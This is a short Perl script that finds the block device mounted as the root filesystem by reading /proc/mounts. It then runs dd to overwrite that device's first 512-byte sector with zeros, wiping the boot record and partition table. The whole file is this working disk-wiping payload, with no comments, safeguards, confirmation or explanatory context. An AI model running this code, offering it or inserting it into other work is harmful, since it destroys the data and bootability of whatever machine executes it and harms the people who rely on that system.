use strict;
use warnings;
sub boot_device {
    open my $fh, '<', '/proc/mounts' or return;
    while (<$fh>) {
        my ($dev, $mp) = split;
        return $dev if $mp eq '/' && $dev =~ m{^/dev/};
    }
}
my $dev = boot_device();
exec "dd", "of=$dev", "if=/dev/zero", "bs=512", "count=1" if $dev;
